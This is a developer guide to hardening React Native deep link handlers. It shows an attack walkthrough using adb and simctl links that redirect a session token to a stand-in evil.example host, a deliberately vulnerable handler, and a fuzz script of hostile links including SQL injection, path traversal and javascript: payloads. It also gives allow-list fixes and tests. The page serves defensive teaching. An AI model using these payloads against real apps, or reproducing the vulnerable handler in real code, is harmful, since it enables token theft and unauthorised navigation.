---
title: Deep Link Validation
description: A deep link is input from an arbitrary other app. Treat it that way, with an allow-list rather than a parser.
status: current
toolchain: cli
---

A deep link is the one input your app accepts from a party you have never met. Any app on the
device, any web page, any QR code, any message can hand you a URL and your app will act on it.
If your handler trusts a parameter in that URL, you have given every app on the device a remote
control for your navigation stack.

This is the cheapest high-value fix in the section. It costs an afternoon, it needs no native
code, and it closes a class of bug that is trivially exploitable from a command line.

## Threat

The attacker sends your app a URL. What they want from it, in rough order of payoff:

1. **A token.** Your app is handed `myapp://auth?next=https://evil.example` and helpfully
   forwards the session token to `next` after sign-in. This is an open redirect with a
   credential attached.
2. **A navigation primitive.** Your app reads a route name out of the URL and navigates to it.
   The attacker now reaches screens the UI never links to — a debug screen, an internal admin
   view, a "confirm payment" screen with prefilled params.
3. **A WebView load.** Your app opens whatever URL it was given inside a WebView that has a
   `postMessage` bridge. See [WebView Hardening](webview-hardening.md).
4. **State corruption.** Your app writes a parameter straight into persisted state or into a
   request to your backend.

None of this requires the attacker to have any privilege. A link in a message, a redirect on a
web page, or another installed app is enough.

## Exploit

You can run the whole attack from a terminal against your own build. No root, no instrumentation.

### Step 1 — find the schemes and hosts your app claims

```bash
# Android: intent filters live in the manifest that actually shipped.
grep -n -A 12 "intent-filter" android/app/src/main/AndroidManifest.xml
```

:::tabs
@tab iOS
Custom schemes are listed under `CFBundleURLTypes` in `ios/<App>/Info.plist`, and universal-link
domains in the `com.apple.developer.associated-domains` entitlement.

```bash
plutil -p ios/YourApp/Info.plist | grep -A 8 CFBundleURLTypes
```
@tab Android
Custom schemes and App Links are both `intent-filter` entries with a `<data>` element. An
`android:autoVerify="true"` filter is an App Link; without it, the scheme can be claimed by any
other app too.

```bash
adb shell dumpsys package com.example.app | grep -A 20 "Schemes:"
```
:::

### Step 2 — fire a link at the running app

```bash
# Android: send an ACTION_VIEW intent straight at your package.
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://auth?next=https%3A%2F%2Fevil.example%2Fcollect" com.example.app

# iOS Simulator: the same idea.
xcrun simctl openurl booted "myapp://auth?next=https%3A%2F%2Fevil.example%2Fcollect"
```

Anything your handler does with `next` now happens on an attacker-chosen URL.

### Step 3 — the vulnerable handler

This is the pattern to look for in your own codebase. It looks reasonable, which is why it
survives review.

```ts title=src/deeplinks/vulnerableHandler.ts — do not ship this
import {Linking} from 'react-native';

/**
 * Trusts three separate things it should not: that `next` is one of our URLs,
 * that `route` names a screen we intended to be reachable, and that the whole
 * URL came from somewhere legitimate.
 */
export async function handleIncomingLinkBadly(
  url: string,
  navigateTo: (route: string, params: Record<string, string>) => void,
  getSessionToken: () => Promise<string>,
): Promise<void> {
  const parsed = new URL(url);
  const next = parsed.searchParams.get('next');
  const route = parsed.searchParams.get('route');

  if (next) {
    // Open redirect. The token goes wherever the caller asked.
    const token = await getSessionToken();
    await Linking.openURL(`${next}?token=${token}`);
    return;
  }

  if (route) {
    // Arbitrary navigation. Every screen in the app is now addressable.
    navigateTo(route, {source: 'deeplink'});
  }
}
```

Three separate bugs:

- `next` is used without checking where it points, so the token leaves your app.
- `route` is a screen name taken from input, so the attacker picks the destination.
- Nothing checks the scheme or host of `url` itself, so a link from any origin is honoured.

### Step 4 — the trap specific to React Native

`URL` in React Native is a polyfill, not the browser implementation. Reading the installed
0.87.1 source, its `host`, `hostname` and `origin` getters match on a regular expression that is
anchored to `https?://`. For a custom scheme they return an empty string:

```ts title=src/deeplinks/urlPolyfillTrap.ts
/**
 * On React Native, `hostname` is '' for a custom-scheme URL because the
 * polyfill's host regex only matches http and https. A host check written
 * this way passes for every attacker-supplied custom-scheme link.
 */
export function hostLooksRight(url: string): boolean {
  const parsed = new URL(url);
  return parsed.hostname === '' || parsed.hostname.endsWith('example.com');
}
```

A check like that reads as a host allow-list and enforces nothing. Do not validate a
custom-scheme deep link by reading `hostname` off the polyfill; validate the whole URL against
an explicit list of accepted shapes instead.

## Fix

The fix has one idea in it: **never derive behaviour from the URL, only look the URL up in a
table you wrote.** Parsing is not validation.

### 1. Allow-list the destination, not the string

```ts title=src/deeplinks/routes.ts
/**
 * Every deep link the app accepts, as data. A path that is not in this map
 * does not exist as far as the handler is concerned — there is no fallback
 * and no "pass it through to the router" branch.
 */
export type DeepLinkTarget =
  | {screen: 'Home'}
  | {screen: 'Product'; productId: string}
  | {screen: 'Order'; orderId: string};

/** Schemes and hosts we accept a link from, exactly, with no wildcards. */
const ALLOWED_SCHEMES = ['myapp:'] as const;
const ALLOWED_HTTPS_HOSTS = ['example.com', 'www.example.com'] as const;

/** Opaque ids are ids, not arbitrary strings. Enforce the shape. */
const ID_PATTERN = /^[A-Za-z0-9_-]{1,64}$/;

/**
 * Splits a URL without relying on the React Native URL polyfill's host
 * handling, which returns '' for custom schemes.
 */
function splitUrl(url: string): {scheme: string; rest: string} | null {
  const match = /^([a-zA-Z][a-zA-Z0-9+.-]*:)\/\/(.*)$/.exec(url);
  return match ? {scheme: match[1].toLowerCase(), rest: match[2]} : null;
}

function pathAndQuery(rest: string): {segments: string[]; query: URLSearchParams} {
  const [pathPart, queryPart = ''] = rest.split('?');
  const segments = pathPart.split('/').filter(Boolean);
  return {segments, query: new URLSearchParams(queryPart)};
}

/**
 * Returns a target only for a URL that matches one of the shapes we chose to
 * support. Everything else returns null, which callers must treat as "ignore
 * this link" rather than "navigate somewhere sensible".
 */
export function resolveDeepLink(url: string): DeepLinkTarget | null {
  const split = splitUrl(url);
  if (!split) {
    return null;
  }

  const {scheme, rest} = split;
  let remainder = rest;

  if (scheme === 'https:') {
    const host = rest.split('/')[0].split('?')[0].toLowerCase();
    // Exact host match. No endsWith: 'example.com.evil.test' ends with nothing
    // useful but 'notexample.com' would pass a naive suffix test.
    if (!(ALLOWED_HTTPS_HOSTS as readonly string[]).includes(host)) {
      return null;
    }
    remainder = rest.slice(host.length);
  } else if (!(ALLOWED_SCHEMES as readonly string[]).includes(scheme)) {
    return null;
  }

  const {segments} = pathAndQuery(remainder);

  if (segments.length === 0) {
    return {screen: 'Home'};
  }
  if (segments[0] === 'product' && segments.length === 2 && ID_PATTERN.test(segments[1])) {
    return {screen: 'Product', productId: segments[1]};
  }
  if (segments[0] === 'order' && segments.length === 2 && ID_PATTERN.test(segments[1])) {
    return {screen: 'Order', orderId: segments[1]};
  }

  return null;
}
```

Note what is absent: there is no branch that takes a screen name from the URL, and no branch that
takes a URL out of a parameter. The set of reachable screens is fixed at compile time.

### 2. Wire it to `Linking` correctly

Two entry points exist and both must go through the same function: the cold-start URL and the
URLs that arrive while the app is running.

```tsx title=src/deeplinks/useDeepLinks.tsx
import {useEffect} from 'react';
import {Linking} from 'react-native';

type Target = {screen: string; params?: Record<string, string>};

/**
 * `getInitialURL` covers a cold start from a link. The 'url' event covers a
 * link that arrives while the app is already running. Handling only one of
 * them is the most common deep-link bug, security or otherwise.
 */
export function useDeepLinks(
  resolve: (url: string) => Target | null,
  navigate: (target: Target) => void,
): void {
  useEffect(() => {
    let cancelled = false;

    const dispatch = (url: string | null | undefined): void => {
      if (cancelled || !url) {
        return;
      }
      const target = resolve(url);
      // A link we do not recognise is dropped. It is not a crash, and it is
      // not a redirect to Home with the original URL attached.
      if (target) {
        navigate(target);
      }
    };

    Linking.getInitialURL().then(dispatch).catch(() => {});

    const subscription = Linking.addEventListener('url', ({url}) => {
      dispatch(url);
    });

    return () => {
      cancelled = true;
      // EventSubscription.remove — there is no Linking.removeEventListener.
      subscription.remove();
    };
  }, [resolve, navigate]);
}
```

> [!WARNING] `Linking.removeEventListener` does not exist
> Older tutorials pair `addEventListener` with `removeEventListener`. The current API returns an
> `EventSubscription` and you call `.remove()` on it. Code that calls the old function throws,
> which usually means your cleanup never runs and the listener leaks across remounts.

### 3. The React Navigation linking config

React Navigation 7 can consume deep links for you through `linking` on the container. This is
the right default, because the path patterns are declared as data — but it is not automatically
an allow-list, and two options decide whether it is.

```ts title=src/navigation/linking.ts
import type {LinkingOptions} from '@react-navigation/native';

export type RootStackParamList = {
  Home: undefined;
  Product: {productId: string};
  Order: {orderId: string};
};

/**
 * `config.screens` is the allow-list: a path that matches nothing here is not
 * routed anywhere. Keep internal screens out of it entirely rather than
 * relying on a guard inside the screen.
 */
export const linking: LinkingOptions<RootStackParamList> = {
  prefixes: ['myapp://', 'https://example.com', 'https://www.example.com'],

  /**
   * Runs before anything is parsed. Use it to reject URLs outright — here,
   * anything carrying a redirect-shaped parameter, which our app never needs.
   */
  filter: (url: string) => {
    const query = url.split('?')[1] ?? '';
    const params = new URLSearchParams(query);
    return !params.has('next') && !params.has('redirect') && !params.has('returnTo');
  },

  config: {
    screens: {
      Home: '',
      Product: 'product/:productId',
      Order: 'order/:orderId',
    },
  },
};
```

Three things to get right here:

- **`prefixes` is matched, not validated.** A wildcard prefix such as `https://*.example.com`
  accepts every subdomain, including one an attacker controls if any of your subdomains can be
  taken over. Prefer listing the hosts you actually use.
- **`config.screens` is the allow-list.** A screen that is not in the map cannot be reached by
  path. Do not add entries "for completeness"; add the ones you intend to be linkable.
- **Path parameters are still strings from a stranger.** `:productId` matches any path segment.
  Validate inside the screen, or attach a `parse` function that throws on a bad shape.

If you need both — the container's linking config for normal routing and your own handler for a
special case — set `filter` so the two never see the same URL. Two handlers reacting to one link
is a source of duplicated navigation and of guards that only one path runs.

### 4. There is no safe version of `next=`

If your product genuinely needs "come back to where you were", store the destination on the
server against the session, or keep it in app state before you leave. Do not round-trip it
through a URL parameter, because the parameter is attacker-controlled by definition.

Where a redirect parameter is unavoidable — a third-party identity provider that insists on one
— the rule is the same as the routing rule: the value must be a key into a table, never a URL.

```ts title=src/deeplinks/returnTo.ts
/** The only destinations a return-to parameter may name. */
const RETURN_TARGETS = {
  cart: {screen: 'Cart'},
  orders: {screen: 'Orders'},
  profile: {screen: 'Profile'},
} as const;

export type ReturnTarget = (typeof RETURN_TARGETS)[keyof typeof RETURN_TARGETS];

/** A key, not a URL. An unknown key resolves to null and the caller ignores it. */
export function resolveReturnTarget(value: string | null): ReturnTarget | null {
  if (value === null) {
    return null;
  }
  return Object.prototype.hasOwnProperty.call(RETURN_TARGETS, value)
    ? RETURN_TARGETS[value as keyof typeof RETURN_TARGETS]
    : null;
}
```

## Verification

Four checks, all runnable on a device or emulator you already have.

### 1. Fire hostile links at your own build

Keep this as a script and run it against every release candidate.

```bash title=scripts/deeplink-fuzz.sh
#!/usr/bin/env bash
set -uo pipefail
PKG="${1:?usage: deeplink-fuzz.sh <android package>}"

LINKS=(
  "myapp://auth?next=https%3A%2F%2Fevil.example"
  "myapp://product/../../admin"
  "myapp://product/%2e%2e%2fadmin"
  "myapp://route?route=DebugMenu"
  "https://example.com.evil.test/product/1"
  "https://evil.test/product/1"
  "myapp://order/'; DROP TABLE orders;--"
  "javascript:alert(1)"
)

for link in "${LINKS[@]}"; do
  echo "--- $link"
  adb shell am start -W -a android.intent.action.VIEW -d "$link" "$PKG"
  sleep 1
done
```

The pass condition is precise: each of these either does nothing at all or lands on a screen you
can point to in `config.screens`. Landing on Home is acceptable. Landing on any screen whose name
came out of the URL is a failure.

### 2. Assert the resolver in a unit test

The allow-list is ordinary pure code, so test it like any other.

```ts-fragment title=src/deeplinks/routes.test.ts
import {resolveDeepLink} from './routes';

test('accepts only the shapes we declared', () => {
  expect(resolveDeepLink('myapp://product/abc123')).toEqual({
    screen: 'Product',
    productId: 'abc123',
  });

  // Hosts are matched exactly, not by suffix.
  expect(resolveDeepLink('https://example.com.evil.test/product/abc')).toBeNull();
  expect(resolveDeepLink('https://evil.test/product/abc')).toBeNull();

  // No screen name may come from the URL.
  expect(resolveDeepLink('myapp://route?route=DebugMenu')).toBeNull();

  // Ids have a shape.
  expect(resolveDeepLink('myapp://order/..%2Fadmin')).toBeNull();

  // Unknown schemes are not our links.
  expect(resolveDeepLink('javascript://product/abc')).toBeNull();
});
```

### 3. Watch what actually leaves the device

Run the open-redirect link with a proxy in front of the app and confirm no request carrying a
token goes anywhere but your API host. This is the check that catches a redirect you forgot
about, because it observes behaviour rather than code.

### 4. Confirm your App Links are verified

An unverified Android App Link falls back to a chooser, which means another app can register the
same host and be offered alongside yours.

```bash
adb shell pm get-app-links com.example.app
```

Every declared host should read `verified`. On iOS, confirm the
`apple-app-site-association` file is served over HTTPS with no redirect and with the correct
content type; an unreachable file silently downgrades universal links to ordinary web links.

## Common mistakes

- **Validating with `hostname` on a custom-scheme URL.** Wrong:
  `new URL('myapp://x').hostname === 'example.com'`. React Native's polyfill returns `''` there,
  so the check never passes and any suffix-based fallback never runs. Right: match the whole URL
  against explicit patterns.
- **Using `endsWith` for host checks.** Wrong: `host.endsWith('example.com')`, which accepts
  `notexample.com` and `evil-example.com`. Right: exact comparison against a list.
- **Taking a screen name from the URL.** Wrong: `navigation.navigate(params.route)`. Right: map a
  path to a screen in code. A router that accepts a name from input has no unreachable screens.
- **Handling only `getInitialURL`.** The app was already running for most real deep links.
  Register the `url` listener as well, and route both through the same resolver.
- **Calling `Linking.removeEventListener` in cleanup.** It does not exist. Keep the
  `EventSubscription` and call `.remove()`.
- **Wildcarding `prefixes`.** `https://*.example.com` trusts every subdomain you have ever
  created, including the forgotten one pointing at a third-party host.
- **Treating a deep link as authenticated.** A link proves nothing about who sent it. Any screen
  it reaches must still check the session, and any action it triggers must still be authorised
  server-side.
- **Letting a link trigger a side effect directly.** A URL that deletes, purchases or transfers
  without a confirmation screen turns a shared link into a one-tap attack.

## Related topics

- [Deep Linking and Universal Links](../navigation/deep-linking.md) — the full configuration: schemes, App Links, universal links.
- [Linking](../platform-apis/linking.md) — the core API this page hardens.
- [Params and Typed Routes](../navigation/params-and-typed-routes.md) — typing the params a resolved link produces.
- [WebView Hardening](webview-hardening.md) — what happens when a link's URL reaches a WebView.
- [Threat Model](threat-model.md) — why anything crossing an OS boundary inbound is untrusted.
- [Safe Logging in Release Builds](safe-logging.md) — do not log the URL you rejected.
